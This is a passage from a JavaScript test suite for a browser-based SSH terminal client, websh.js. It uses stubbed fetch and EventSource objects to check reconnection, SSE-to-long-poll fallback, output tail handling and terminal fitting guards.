     'no save POST after closing the pane within the window; got ' + saveCalled);
  cleanup(env);
});

test('auto-connect failure → user dismiss popup → form appears', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: true, connections:
      [{name: 'hetzner-hel', kind: 'ready', host: '1.2.3.4', port: 22,
        username: 'alex', persistent: false}]}},
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await sleep(120);
  ok(!hidden($(win, 'tmuxOv')), 'popup visible');
  ok($(win, 'tmTitle').textContent === 'Authentication failed', 'auth fail title; got=' + $(win, 'tmTitle').textContent);
  ok(paneList(win).length === 0, 'no pane');
  clickBtn(win, 'tmCancel');
  await sleep(20);
  ok(hidden($(win, 'tmuxOv')), 'popup hidden');
  ok(!hidden($(win, 'ov')), 'form appears as fallback');
  cleanup(env);
});

// =====================================================================
// Regression: handleOutputPayload must NOT drop tail-drain bytes
// arriving after a frame that already flipped alive=false.
// SSE _stream emits {data, alive:false} → tail-drain {data:"x",
// alive:false} → event:end{alive:false}. The idempotency guard for
// the disconnect/auth-failed branches must sit AFTER the r.data
// handler, otherwise the tail bytes vanish.
test('disconnect: tail-drain data after alive=false still rendered', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
  const env = await mkEnv(plan); const win = env.win;
  // Capture every term.write into an array we can assert on.
  const writes = [];
  // Build a minimal pane object the way websh.js itself does, then
  // hand it to handleOutputPayload directly (bypassing transports).
  const p = {
    id: 'p1', sid: 'abc', polling: true,
    term: {
      write(b) {
        if (typeof b === 'string') { writes.push(b); return; }
        // Uint8Array-like: array of byte values. instanceof Uint8Array
        // doesn't cross the jsdom realm boundary, so feature-detect.
        let s = ''; for (let i = 0; i < b.length; i++) s += String.fromCharCode(b[i]);
        writes.push(s);
      },
      buffer: {active: {type: 'normal'}}
    },
    el: win.document.createElement('div'),
    persistent: false, host: '', connection: null,
    connectedAt: 0, recentOutput: ''
  };
  // Inject the pane into websh.js' module-scope panes registry, and
  // expose handleOutputPayload (a function declaration, so it's already
  // on window).
  win._tp = p;
  win.eval(`panes['p1'] = window._tp; activeId = 'p1';`);
  // Frame 1: final output + alive=false. Should write 'first' AND
  // the closed banner, then null p.sid.
  win.handleOutputPayload(p, {data: win.btoa('first\r\n'), alive: false});
  ok(p.sid === null, 'p.sid nulled after alive=false; got ' + p.sid);
  let bannerCount = writes.filter(s => s.indexOf('connection closed') !== -1).length;
  ok(bannerCount === 1, 'banner written once; got ' + bannerCount);
  ok(writes.some(s => s.indexOf('first') !== -1), 'first chunk rendered; writes=' + JSON.stringify(writes));
  // Frame 2 (tail-drain): alive=false again, with new bytes. The
  // bytes MUST land in the terminal — losing them silently would be
  // a regression. The banner MUST NOT be re-written.
  win.handleOutputPayload(p, {data: win.btoa('tail-bytes\r\n'), alive: false});
  ok(writes.some(s => s.indexOf('tail-bytes') !== -1),
     'tail bytes rendered; writes=' + JSON.stringify(writes));
  bannerCount = writes.filter(s => s.indexOf('connection closed') !== -1).length;
  ok(bannerCount === 1, 'banner still written only once; got ' + bannerCount);
  // Frame 3: the bare event:end frame. No data, alive=false. Should
  // be a complete no-op.
  const wlen = writes.length;
  win.handleOutputPayload(p, {alive: false});
  ok(writes.length === wlen, 'event:end is no-op; new writes=' + (writes.length - wlen));
  cleanup(env);
});

// =====================================================================
// Fix A regression: SSE 'open' event MUST NOT disarm the first-message
// buffer-detection timer. 'open' fires when HTTP response headers arrive
// — before any body byte traverses an upstream proxy. A buffering proxy
// flushes headers immediately and holds the body, which is exactly the
// case the timer is meant to detect. Only body events ('data' / 'end')
// prove the channel actually flushes.
// A fetch that returns a given HTTP status for /api/output (the plan's
// fake fetch has no status); everything else goes to the plan.
function outputReplies(win, replies, log) {
  const inner = win.fetch;
  const st = inner.__state || {dead: false};      // die with the env
  const fn = (url, init) => {
    const u = new URL(url, 'http://x/');
    const a = u.searchParams.get('action');
    if (st.dead) return new Promise(() => {});
    if (a === 'output' && replies.length) {
      // The last reply repeats: the loop keeps polling after the test's
      // scripted sequence and must not fall through to "session gone".
      const [status, body] = replies.length > 1 ? replies.shift() : replies[0];
      log.push('output:' + status);
      // Through a timer, like a real network: an already-resolved reply
      // turns the poll loop into an endless microtask chain that starves
      // every timer (the test itself included).
      return sleep(3).then(() => ({status, statusText: '',
        json: () => typeof body === 'string' ? Promise.reject(new Error('html'))
                                             : Promise.resolve(body)}));
    }
    if (a) log.push(a);
    return inner(url, init);
  };
  fn.__state = st;
  win.fetch = fn;
}

test('long-poll: a transient 503/502 is retried on the SAME session', async () => {
  // handleOutputPayload treats any {error} as "session gone": one 503
  // busy (or a proxy's HTML 502, which api() turns into {error}) used to
  // end the session WITHOUT /api/disconnect and open a fresh shell,
  // orphaning the old one and whatever ran in it.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-lp', alive: true}},
    {action: 'resize', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  win.nextRetryDelay = () => 1;            // no real backoff in tests
  const log = [];
  p.polling = false; await sleep(20);       // stop the running loop
  outputReplies(win, [[503, {error: 'busy'}], [502, '<html>bad gateway</html>'],
                      [200, {data: '', alive: true}]], log);
  p.polling = true; p.sid = 'sid-lp';
  win.pollOutput(p);
  await sleep(120);
  ok(p.sid === 'sid-lp', 'still the same session; got ' + p.sid);
  ok(!log.includes('connect') && !log.includes('disconnect'),
     'no new shell, nothing orphaned; got ' + log.join(','));
  ok(log.filter(x => x.startsWith('output')).length >= 3,
     'retried until a real frame; got ' + log.join(','));
  p.polling = false;
  cleanup(env);
});

test('long-poll: a real 404 still ends the session and reconnects', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-lp2', alive: true}},
    {action: 'resize', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p = await _onePane(win);
  const log = [];
  p.polling = false; await sleep(20);
  outputReplies(win, [[404, {error: 'session not found'}],
                      [200, {data: '', alive: true}]], log);
  p.polling = true; p.sid = 'sid-lp2';
  win.pollOutput(p);
  await sleep(80);
  ok(log.includes('connect'), 'the gone session is replaced; got ' + log.join(','));
  p.polling = false;
  cleanup(env);
});

test('SSE closed for good (non-200 on reconnect) is recovered, not left spinning', async () => {
  // EventSource never retries after a non-200 reply: the pane showed
  // "reconnecting… (0 s)" forever and dropped keystrokes. It now asks
  // once over HTTP: transient -> retry; frame -> back to SSE.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
  const env = await mkEnv(plan); const win = env.win;
  const sources = [];
  win.EventSource = class {
    constructor(url) { this.url = url; this.readyState = 0; this.l = {}; sources.push(this); }
    addEventListener(ev, fn) { this.l[ev] = fn; }
    set onerror(fn) { this._err = fn; }
    close() { this.readyState = 2; this.closed = true; }
  };
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = 'sse1'; p.polling = true; p.host = 'h'; p.outCursor = 0;
  win.nextRetryDelay = () => 1;
  const log = [];
  outputReplies(win, [[503, {error: 'busy'}], [200, {data: '', alive: true, cursor: 0}]], log);
  win.streamOutput(p);
  const es = sources[0];
  es.l.data({data: JSON.stringify({data: '', alive: true, cursor: 0})});   // was healthy
  es.readyState = 2;                                                     // then CLOSED
  es._err();
  await sleep(120);
  ok(log.slice(0, 2).join(',') === 'output:503,output:200',
     'asked, retried, got a frame; got ' + log.join(','));
  ok(sources.length === 2 && !sources[1].closed, 'back on a fresh EventSource');
  ok(p.sid === 'sse1', 'same session');
  p.polling = false;
  try { win.clearTimeout(p.sseFirstMsgTimer); } catch (e) {}
  cleanup(env);
});

// One stream refused before its first event (409 while the old stream
// held the slot; a deploy restarting the backend) switched the pane to
// long-poll for good: in production a pane polled for hours, a request
// per output chunk. It now asks over HTTP and goes back to the stream.
function sseHarness(win) {
  const sources = [];
  win.EventSource = class {
    constructor(url) { this.url = url; this.readyState = 0; this.l = {}; sources.push(this); }
    addEventListener(ev, fn) { this.l[ev] = fn; }
    set onerror(fn) { this._err = fn; }
    close() { this.readyState = 2; this.closed = true; }
  };
  return sources;
}
function ssePane(win, sid) {
  const p = win.createPane(win.document.getElementById('panes'));
  win.activatePane(p.id);
  p.sid = sid; p.polling = true; p.host = 'h'; p.outCursor = 0;
  return p;
}
function sseStop(win, p) {
  p.polling = false;
  try { win.clearTimeout(p.sseFirstMsgTimer); } catch (e) {}
}

test('SSE refused before its first event goes back to the stream, not to long-poll', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'sse-early');
  win.nextRetryDelay = () => 1;
  const log = [];
  outputReplies(win, [[200, {data: '', alive: true, cursor: 0}]], log);
  win.streamOutput(p);
  sources[0].readyState = 2;            // 409: EventSource gives up at once
  sources[0]._err();
  await sleep(60);
  ok(!p.sseDisabled, 'SSE not disabled by one early error');
  ok(sources.length === 2 && !sources[1].closed, 'back on a fresh EventSource; sources=' + sources.length);
  ok(log.filter(x => x.startsWith('output')).length === 1,
     'one HTTP check, not a poll loop; got ' + log.join(','));
  // A body event on the new stream resets the early-failure count.
  sources[1].l.data({data: JSON.stringify({data: '', alive: true, cursor: 0})});
  ok(p.sseEarlyFails === 0, 'count reset by a real frame; got ' + p.sseEarlyFails);
  sseStop(win, p);
  cleanup(env);
});

test('SSE failing before the first event 3 times in a row falls back to long-poll', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'sse-3x');
  win.nextRetryDelay = () => 1;
  const log = [];
  outputReplies(win, [[200, {data: '', alive: true, cursor: 0}]], log);
  win.streamOutput(p);
  for (let i = 0; i < 3; i++) {
    const es = sources[sources.length - 1];
    es.readyState = 2; es._err();
    await sleep(40);
  }
  ok(p.sseDisabled === true && p.sseDisabledReason === 'errors',
     'disabled after 3 early failures; got ' + p.sseDisabled + '/' + p.sseDisabledReason);
  ok(sources.length === 3, 'no 4th stream; got ' + sources.length);
  const before = log.length;
  await sleep(40);
  ok(log.length > before, 'long-poll is running');
  sseStop(win, p);
  cleanup(env);
});

test('a long-polling pane tries the stream NEXT TO the poll loop and switches when it works', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'sse-retry');
  const log = [];
  outputReplies(win, [[200, {data: '', alive: true, cursor: 0}]], log);
  // 'buffering' too: the first-message timer misfires on a slow link.
  p.sseDisabled = true; p.sseDisabledReason = 'buffering'; p.sseDisabledAt = Date.now() - 10 * 60000;
  win.pollOutput(p);
  await sleep(40);
  ok(sources.length === 1 && p.sseProbe === sources[0], 'probe stream opened; sources=' + sources.length);
  ok(p.sseDisabled === true, 'still long-polling while the probe is out');
  const polled = log.length;
  await sleep(40);
  ok(log.length > polled, 'output keeps flowing during the probe (no freeze)');
  sources[0].l.data({data: JSON.stringify({data: '', alive: true, cursor: 0})});
  ok(!p.sseDisabled && sources.length === 2 && p.eventSource === sources[1],
     'an event arrived: switched to the stream; sources=' + sources.length);
  ok(sources[0].closed, 'probe closed');
  const after = log.length;
  await sleep(60);
  ok(log.length - after <= 1, 'poll loop stopped; extra polls=' + (log.length - after));
  sseStop(win, p);
  cleanup(env);
});

test('a failed stream probe leaves the pane polling and doubles the wait', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'sse-probe-fail');
  const log = [];
  outputReplies(win, [[200, {data: '', alive: true, cursor: 0}]], log);
  p.sseDisabled = true; p.sseDisabledReason = 'errors'; p.sseDisabledAt = Date.now() - 10 * 60000;
  win.pollOutput(p);
  await sleep(40);
  ok(sources.length === 1, 'probe opened');
  sources[0]._err();
  ok(p.sseDisabled && !p.sseProbe && sources[0].closed, 'probe failed: still long-poll');
  ok(p.sseProbeWait === 240000, 'wait doubled; got ' + p.sseProbeWait);
  const n = log.length;
  await sleep(40);
  ok(log.length > n && sources.length === 1, 'polling goes on, no immediate re-probe');
  sseStop(win, p);
  cleanup(env);
});

test('only one poll loop per pane: a second start supersedes the first', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.EventSource = undefined;
  const p = ssePane(win, 'one-loop');
  let inflight = 0, max = 0;
  const base = win.fetch;
  win.fetch = (url, init) => {
    if (!/action=output/.test(url)) return base(url, init);
    inflight++; max = Math.max(max, inflight);
    return new Promise((res, rej) => {
      const t = setTimeout(() => { inflight--; res({status: 200, json: () => Promise.resolve({data: '', alive: true, cursor: 0})}); }, 15);
      if (init && init.signal) init.signal.addEventListener('abort', () => { clearTimeout(t); inflight--; rej(new Error('aborted')); });
    });
  };
  win.fetch.__state = base.__state;
  win.pollOutput(p);
  await sleep(5);
  win.pollOutput(p);            // e.g. fallback and reconnect both starting one
  win.startOutput(p);
  await sleep(120);
  ok(max === 1, 'never two polls in flight; got ' + max);
  ok(inflight === 1, 'and the loop is alive; inflight=' + inflight);
  sseStop(win, p);
  cleanup(env);
});

// "Keys go out, nothing comes back, until I reload": the connection died
// without a FIN (Wi-Fi switched, laptop slept) and nothing told the browser.
test('stalled stream: no ping for SSE_STALL_MS restarts it from the cursor', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'stall');
  p.outCursor = 321;
  win.streamOutput(p);
  sources[0].l.ping({data: '{}'});
  ok(p.serverPings === true, 'server heartbeat seen');
  win.outputWatchdogTick();
  ok(sources.length === 1, 'a fresh stream is left alone');
  p.sseLastAt = Date.now() - 41000;
  p.lastKickAt = 0;
  win.outputWatchdogTick();
  ok(sources.length === 2 && sources[0].closed, 'silent stream replaced; sources=' + sources.length);
  ok(/since=321/.test(sources[1].url), 'resumes from the cursor; url=' + sources[1].url);
  sseStop(win, p);
  cleanup(env);
});

test('stalled stream: a server without pings is never restarted on silence', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'noping');
  win.streamOutput(p);
  sources[0].l.data({data: JSON.stringify({data: '', alive: true, cursor: 0})});
  p.sseLastAt = Date.now() - 10 * 60000;
  win.outputWatchdogTick();
  ok(sources.length === 1, 'quiet session on an older server left alone');
  sseStop(win, p);
  cleanup(env);
});

test('input reply ahead of the pane\'s cursor restarts a channel that is not delivering', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.OUTPUT_LAG_MS = 40;
  const sources = sseHarness(win);
  const p = ssePane(win, 'lag');
  p.outCursor = 100;
  win.streamOutput(p);
  sources[0].l.data({data: JSON.stringify({data: '', alive: true, cursor: 100})});
  const base = win.fetch;
  win.fetch = (url, init) => /action=input/.test(url)
    ? Promise.resolve({status: 200, json: () => Promise.resolve({ok: true, alive: true, cursor: 164})})
    : base(url, init);
  win.fetch.__state = base.__state;
  win.queueInput(p, 'ls\r');
  await sleep(120);
  ok(sources.length === 2 && sources[0].closed, 'dead stream replaced; sources=' + sources.length);
  ok(/since=100/.test(sources[1].url), 'from the cursor; url=' + sources[1].url);
  sseStop(win, p);
  cleanup(env);
});

test('input reply: a pane that is behind but still receiving is left alone', async () => {
  // A slow link catching up on a burst: the cursor moves, the channel
  // is alive - restarting it would only resend what is in flight.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.OUTPUT_LAG_MS = 40;
  const sources = sseHarness(win);
  const p = ssePane(win, 'slowlink');
  p.outCursor = 100;
  win.streamOutput(p);
  const base = win.fetch;
  win.fetch = (url, init) => /action=input/.test(url)
    ? Promise.resolve({status: 200, json: () => Promise.resolve({ok: true, alive: true, cursor: 5000000})})
    : base(url, init);
  win.fetch.__state = base.__state;
  win.queueInput(p, 'x');
  await sleep(20);
  sources[0].l.data({data: JSON.stringify({data: Buffer.from('abc').toString('base64'), alive: true, cursor: 103})});   // far behind, but moving
  await sleep(100);
  ok(sources.length === 1 && !sources[0].closed, 'stream kept; sources=' + sources.length);
  sseStop(win, p);
  cleanup(env);
});

test('input reply: a pane that caught up is left alone', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.OUTPUT_LAG_MS = 40;
  const sources = sseHarness(win);
  const p = ssePane(win, 'nolag');
  p.outCursor = 100;
  win.streamOutput(p);
  const base = win.fetch;
  win.fetch = (url, init) => /action=input/.test(url)
    ? Promise.resolve({status: 200, json: () => Promise.resolve({ok: true, alive: true, cursor: 103})})
    : base(url, init);
  win.fetch.__state = base.__state;
  win.queueInput(p, 'x');
  await sleep(20);
  sources[0].l.data({data: JSON.stringify({data: Buffer.from('abc').toString('base64'), alive: true, cursor: 103})});
  await sleep(100);
  ok(sources.length === 1 && !sources[0].closed, 'healthy stream untouched; sources=' + sources.length);
  sseStop(win, p);
  cleanup(env);
});

test('network back (online event) and a clock jump restart every pane\'s channel', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'online');
  win.streamOutput(p);
  win.dispatchEvent(new win.Event('online'));
  ok(sources.length === 2 && sources[0].closed, 'online: stream restarted; sources=' + sources.length);
  win.watchdogLastTick = Date.now() - 10 * 60000;            // the laptop slept
  win.outputWatchdogTick();
  ok(sources.length === 3 && sources[1].closed, 'after sleep: stream restarted; sources=' + sources.length);
  sseStop(win, p);
  cleanup(env);
});

test('first-message timer firing late (page was asleep) restarts the stream, keeps SSE', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const sources = sseHarness(win);
  const p = ssePane(win, 'late-timer');
  const realST = win.setTimeout; let fire = null;
  win.setTimeout = (fn, ms) => { if (ms === 5000 && !fire) { fire = fn; return 0; } return realST(fn, ms); };
  const realNow = win.Date.now;
  win.streamOutput(p);
  win.setTimeout = realST;
  ok(typeof fire === 'function', 'timer captured');
  win.Date.now = () => realNow() + 60000;      // woke up a minute later
  fire();
  win.Date.now = realNow;
  ok(!p.sseDisabled, 'SSE not written off as buffered');
  ok(sources.length === 2, 'stream started over; sources=' + sources.length);
  sseStop(win, p);
  cleanup(env);
});

test("SSE 'open' event does not mark body as arrived", async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
  const env = await mkEnv(plan); const win = env.win;

  // Capture the listeners streamOutput attaches to its EventSource.
  const captured = {listeners: {}};
  win.EventSource = class {
    constructor(url) { captured.url = url; }
    addEventListener(event, fn) { captured.listeners[event] = fn; }
    set onerror(fn) { captured.onerror = fn; }
    close() { captured.closed = true; }
  };

  const p = {
    id: 'p1', sid: 'abc', polling: true,
    term: {write: () => {}, buffer: {active: {type: 'normal'}}},
    el: win.document.createElement('div'),
    persistent: false, host: '', connection: null,
    connectedAt: 0, recentOutput: '',
    firstFailureAt: 0, retryCount: 0, pollRetries: 0,
  };
  win._tp = p;
  win.eval(`panes['p1'] = window._tp; activeId = 'p1';`);

  win.streamOutput(p);
  ok(p.sseFirstMsgTimer != null,
     'first-message timer armed; got ' + p.sseFirstMsgTimer);
  ok(p.sseGotAnyMessage === false,
     'sseGotAnyMessage=false before any event; got ' + p.sseGotAnyMessage);

  // 'open' fires when HTTP headers arrive. It must NOT flip
  // sseGotAnyMessage and must NOT clear the retry clock — a buffering
  // proxy passes headers through but holds the body. The handler may
  // either register an 'open' listener that's a no-op, or skip the
  // listener entirely; both are correct. Fire whatever the handler
  // registered (if any) and verify nothing changes.
  if (typeof captured.listeners.open === 'function') {
    p.firstFailureAt = 12345; // sentinel: must NOT be cleared by 'open'
    captured.listeners.open();
    ok(p.sseGotAnyMessage === false,
       "'open' must not mark body arrived; got " + p.sseGotAnyMessage);
    ok(p.sseFirstMsgTimer != null,
       "'open' must not clear first-message timer; got " + p.sseFirstMsgTimer);
    ok(p.firstFailureAt === 12345,
       "'open' must not clear retry clock; got " + p.firstFailureAt);
  }

  // Fire 'data' with a benign payload: NOW the body has arrived.
  captured.listeners.data({data: JSON.stringify({data: '', alive: true})});
  ok(p.sseGotAnyMessage === true,
     "'data' marks body arrived; got " + p.sseGotAnyMessage);
  cleanup(env);
});

// fitPaneWhenStable runs an async settle loop and is called from
// multiple places (createPane, applySettings, the 1 s drift watchdog,
// kickPanesAfterAbsence). An earlier iteration had a self-feeding
// listener that called it from xterm's onCharSizeChange event, which
// the function itself fires synchronously via its fontFamily round-
// trip — exponential Promise pile-up froze the JS event loop and
// blocked SSE delivery. The `p._fitInFlight` guard prevents any
// future re-entry from rebuilding that runaway. This test simulates
// rapid re-entry: ten calls in tight succession produce one in-flight
// chain, not ten, and the flag releases cleanly on completion.
test('fitPaneWhenStable bails on re-entry while in flight', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  let fitCount = 0;
  const p = {
    id: 'p1',
    fitAddon: { fit() { fitCount++; } },
    term: {
      cols: 80,
      options: { fontFamily: 'monospace' },
      _core: { _charSizeService: { measure() {}, width: 9 } },
    },
    sid: null,
  };
  win._tp = p;
  win.eval(`panes['p1'] = window._tp;`);

  // Fire 10 calls back-to-back. Without the guard each would queue
  // its own settle-loop RAF chain; with the guard the first call
  // claims `_fitInFlight` and the other nine bail synchronously.
  for (let i = 0; i < 10; i++) win.fitPaneWhenStable(p);
  ok(p._fitInFlight === true,
     'first call took the in-flight flag; got ' + p._fitInFlight);

  // Let the awaited Promise.resolve() and the settle RAFs run.
  await sleep(200);

  ok(p._fitInFlight === false,
     'flag releases after settle completes; got ' + p._fitInFlight);
  // The mock Terminal returns cols=80 every fit, so the settle loop
  // converges in exactly two iterations: iter 1 sees lastCols=-1 → 80
  // (continue), iter 2 sees 80 === 80 (exit). Pin to 2 — a wider range
  // (1-4) would pass even on a partial regression where the guard
  // succeeds only 50 % of the time. Without the guard, all ten chains
  // run their two iterations each → fitCount=20.
  ok(fitCount === 2,
     `single chain expected (exactly 2 fit calls — one settle pair), got ${fitCount}`);

  cleanup(env);
});

// 10 s stuck-timer: when document.fonts.ready never resolves (CDN
// blocked / captive portal / unrelated webfont hung), the in-flight
// flag would stay true forever and every subsequent refit — including
// the 1 s drift watchdog — would silently bail. The setTimeout(…, 10000)
// safety valve clears the flag after the timeout. We don't actually
// wait 10 s in the test; we hijack window.setTimeout to capture the
// 10 s callback and invoke it manually.
test('fitPaneWhenStable: 10s stuck-timer clears _fitInFlight when fonts hang', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // Stub document.fonts.load / .ready to never resolve — simulates a
  // CDN block. waitFont will stay pending; nothing past it will run.
  win.document.fonts = {
    load: () => new Promise(() => {}),
    ready: new Promise(() => {}),
  };

  // Capture the stuck-timer callback. The implementation calls
  // setTimeout(release, 10000); we trap that one specifically and let
  // every other setTimeout fall through to the real timer.
  let stuckCb = null;
  const realSetTimeout = win.setTimeout;
  win.setTimeout = function (cb, ms) {
    if (ms === 10000) { stuckCb = cb; return 12345; }
    return realSetTimeout.call(win, cb, ms);
  };

  const p = {
    id: 'p1',
    fitAddon: { fit() {} },
    term: { cols: 80,
            options: { fontFamily: 'monospace' },
            _core: { _charSizeService: { measure() {}, width: 9 } } },
    sid: null,
  };
  win._tp = p;
  win.eval(`panes['p1'] = window._tp;`);

  win.fitPaneWhenStable(p);
  ok(p._fitInFlight === true,
     'flag taken on initial call; got ' + p._fitInFlight);
  ok(stuckCb !== null, 'stuck-timer was scheduled');

  // While the font hangs, re-entry must bail (in-flight guard).
  win.fitPaneWhenStable(p);
  ok(p._fitInFlight === true,
     're-entry left flag intact; got ' + p._fitInFlight);

  // Fire the 10 s callback synchronously — simulates wallclock advance.
  stuckCb();
  ok(p._fitInFlight === false,
     'stuck-timer released the flag; got ' + p._fitInFlight);

  cleanup(env);
});

// Paired sentinel for the fontFamily invalidator. xterm v5's options
// setter has a value-equality short-circuit (`rawOptions[k] !== v &&
// fire(k)`), so the *intermediate* value must differ from the
// canonical one — otherwise no re-measure fires. We pair 'monospace'
// with 'serif'; if the user's fontFamily *is* the literal 'monospace'
// the intermediate flips to 'serif', otherwise to 'monospace'. Both
// branches must work.
test('fitPaneWhenStable: sentinel flips serif↔monospace to defeat value-equality short-circuit', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  win.document.fonts = {
    load: () => Promise.resolve(),
    ready: Promise.resolve(),
  };

  function makePane(initial) {
    let ff = initial;
    const writes = [];
    const p = {
      id: 'pX',
      fitAddon: { fit() {} },
      term: {
        cols: 80,
        get options() { return this._opts; },
        _opts: {
          get fontFamily() { return ff; },
          set fontFamily(v) { writes.push(v); ff = v; },
        },
        _core: { _charSizeService: { measure() {}, width: 9 } },
      },
      sid: null,
    };
    return {p, writes};
  }

  // Case 1: original 'monospace' → invalidator must be 'serif'.
  const c1 = makePane('monospace');
  win._tp = c1.p;
  win.eval(`panes['pX'] = window._tp;`);
  win.fitPaneWhenStable(c1.p);
  await sleep(60);
  // writes: [invalidator, original-restored]
  ok(c1.writes[0] === 'serif',
     "'monospace' → invalidator 'serif'; got " + c1.writes[0]);
  ok(c1.writes[1] === 'monospace',
     "restore to original 'monospace'; got " + c1.writes[1]);
  win.eval(`delete panes['pX'];`);

  // Case 2: original anything-else → invalidator must be 'monospace'.
  const c2 = makePane("'JetBrains Mono', monospace");
  win._tp = c2.p;
  win.eval(`panes['pX'] = window._tp;`);
  win.fitPaneWhenStable(c2.p);
  await sleep(60);
  ok(c2.writes[0] === 'monospace',
     "'…Mono, monospace' → invalidator 'monospace'; got " + c2.writes[0]);
  ok(c2.writes[1] === "'JetBrains Mono', monospace",
     "restore to original; got " + c2.writes[1]);
  // Sanity: the two writes must differ — that's the entire point of
  // the pairing. If they ever match, xterm filters both and no
  // re-measure fires.
  ok(c2.writes[0] !== c2.writes[1],
     'invalidator and original must differ (value-equality bypass)');
  cleanup(env);
});

// Happy path: document.fonts.load + .ready resolve cleanly, the
// settle loop iterates, _charSizeService.measure() is called at
// least once on each iteration, and the in-flight flag releases.
// The other tests in this PR all *interrupt* the happy path
// (re-entry guard, stuck-timer, paired sentinel under isolated
// stubs); none drive the full chain through. In jsdom
// document.fonts is undefined by default, so the production
// `webfont && document.fonts && document.fonts.load` branch
// always falls into the no-op Promise.resolve() — without this
// test, the entire fonts.load → fonts.ready → forceMeasure
// pipeline has zero coverage in our test suite.
test('fitPaneWhenStable: happy path drives forceMeasure() + sentinel + release', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  win.document.fonts = {
    load: () => Promise.resolve(),
    ready: Promise.resolve(),
  };

  let measureCalls = 0;
  let writes = [];
  let ff = "'JetBrains Mono', monospace";  // default settings.font
  const p = {
    id: 'pHP',
    fitAddon: { fit() {} },
    term: {
      cols: 80,
      get options() { return this._opts; },
      _opts: {
        get fontFamily() { return ff; },
        set fontFamily(v) { writes.push(v); ff = v; },
      },
      _core: {
        _charSizeService: {
          measure() { measureCalls++; },
          width: 9,
        },
      },
    },
    sid: null,
  };
  win._tp = p;
  win.eval(`panes['pHP'] = window._tp;`);

  win.fitPaneWhenStable(p);
  // Allow: microtasks for fonts.load() → fonts.ready chain, plus
  // the RAF-spaced settle loop (jsdom RAF ≈16 ms, two iterations).
  await sleep(120);

  ok(p._fitInFlight === false,
     'flag released after happy-path settle; got ' + p._fitInFlight);
  ok(writes.length === 2,
     'sentinel fired exactly two fontFamily writes (invalidate + restore); got ' +
     writes.length);
  ok(writes[1] === "'JetBrains Mono', monospace",
     'fontFamily restored to original after sentinel; got ' + writes[1]);
  ok(measureCalls >= 1,
     '_charSizeService.measure() called at least once per settle iteration; got ' +
     measureCalls);
  cleanup(env);
});

// _destroyPane must clear the in-flight stuck-timer so a pane closed
// mid-settle does not hold a 10 s closure reference to a disposed
// pane. Plant a pane, kick fitPaneWhenStable so a stuck-timer is
// armed, intercept setTimeout(…, 10000) to capture the handle, then
// call _destroyPane and assert clearTimeout fired on that handle.
test('_destroyPane clears the fitPaneWhenStable stuck-timer', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false,
                                               connections: []}}];
  const env = await mkEnv(plan);
  const win = env.win;
  // Hang fonts so the settle path stays in flight when we destroy.
  win.document.fonts = {
    load: () => new Promise(() => {}),
    ready: new Promise(() => {}),
  };
  // Capture the 10 s setTimeout handle so we can verify clearTimeout
  // was called on it during destroy.
  let stuckHandle = null;
  let clearedHandles = [];
  const realSetTimeout = win.setTimeout;
  const realClearTimeout = win.clearTimeout;
  win.setTimeout = function (cb, ms) {
    const h = realSetTimeout.call(win, cb, ms);
    if (ms === 10000) stuckHandle = h;
    return h;
  };
  win.clearTimeout = function (h) {
    clearedHandles.push(h);
    return realClearTimeout.call(win, h);
  };

  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  win.fitPaneWhenStable(p);
  ok(p._stuckTimer !== null && p._stuckTimer !== undefined,
     '_stuckTimer recorded on pane');
  ok(stuckHandle !== null, '10 s setTimeout captured');

  win._destroyPane(p.id, false);
  ok(clearedHandles.indexOf(stuckHandle) !== -1,
     'clearTimeout called on the stuck-timer handle during destroy');
  ok(p._stuckTimer === null,
